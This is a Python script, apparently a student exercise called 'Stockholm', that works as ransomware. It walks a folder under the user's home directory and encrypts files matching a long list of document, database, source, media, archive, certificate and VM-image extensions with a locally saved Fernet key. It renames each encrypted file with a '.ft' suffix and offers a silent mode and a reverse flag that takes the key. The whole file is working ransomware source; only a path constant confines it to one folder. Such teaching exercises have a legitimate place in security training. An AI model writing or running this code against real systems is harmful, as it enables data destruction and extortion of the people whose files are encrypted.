# ************************************************************************** #
#   stockholm.py                                                                #
#   By: maperez-                                                             #
#   Created: 2022/08/02                                                      #
# ************************************************************************** #

# Libraries
import argparse 
import os
from cryptography.fernet import Fernet

# A list for the posible files extensions to encrypt.
EXTS = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'
,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'
,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'
,'.vb','.pl','.dip','.dch','.sch','.brd','.jsp','.php','.asp','.rb','.java','.jar','.class','.sh','.mp3','.wav'
,'.swf','.fla','.wmv','.mpg','.vob','.mpeg','.asf','.avi','.mov','.mp4','.3gp','.mkv','.3g2','.flv','.wma','.mid'
,'.m3u','.m4u','.djvu','.svg','.ai','.psd','.nef','.tiff','.tif','.cgm','.raw','.gif','.png','.bmp','.jpg','.jpeg'
,'.vcd','.iso','.backup','.zip','.rar','.7z','.gz','.tgz','.tar','.bak','.tbk','.bz2','.PAQ','.ARC','.aes','.gpg'
,'.vmx','.vmdk','.vdi','.sldm','.sldx','.sti','.sxi','.602','.hwp','.snt','.onetoc2','.dwg','.pdf','.wk1','.wks'
,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']

# Variable declaration.
HOME = os.getenv("HOME") 
PATH = HOME + "/stockholm/infection" # Creates a new PATH by joining HOME and infection folders path.
KEY_FILE = "encrypt.key"

# New options our program has to handle.
parser = argparse.ArgumentParser()
parser.add_argument("-v", "--version", help="show version", \
        action="store_true")
parser.add_argument("-r", "--reverse", help="reverse the infection")
parser.add_argument("-s", "--silent", help="not produce any output", \
        action="store_true")

args = parser.parse_args()

if args.version: # Shows version.
    print("Version: Stockholm 0.1")
    quit()

if not os.path.exists(PATH): # If infection folder doesn´t exist.
    if not args.silent:
        print("... there is not directory: ", PATH)
    quit()

# If we are encrypting and .key doesn´t exist.
if not os.path.exists(KEY_FILE) and args.reverse == None:
    key = Fernet.generate_key() # Generate new .key.
    with open(KEY_FILE, "wb") as f:
        f.write(key)

# read the key
if args.reverse == None:
    with open(KEY_FILE, "rb") as f:
        key = f.read()
    fernet = Fernet(key)
else:
    fernet = Fernet(args.reverse)

def do_crypto(file_path, encrypt=True):
    with open(file_path, "rb") as f:
        original = f.read()


    try:
        if encrypt:
            modified = fernet.encrypt(original)
        else:
            modified = fernet.decrypt(original)

    except:
        print("Decrypt proccess not posible.")
        return

    with open(file_path, "wb") as f:
        f.write(modified)

for root, dirs, files in os.walk(PATH):
    for f in files:
        if not args.reverse and f[f.rfind("."):] != ".ft" \
                and f[f.rfind("."):] in EXTS:
            if not args.silent:
                print(root + "/" + f)
            do_crypto(root + "/" + f)
            os.rename(root + "/" + f, root + "/" + f + ".ft")
        if args.reverse and f[f.rfind("."):] == ".ft":
            if not args.silent:
                print(root + "/" + f)
            do_crypto(root + "/" + f, encrypt=False)
            os.rename(root + "/" + f, root + "/" + f[:f.rfind(".")])
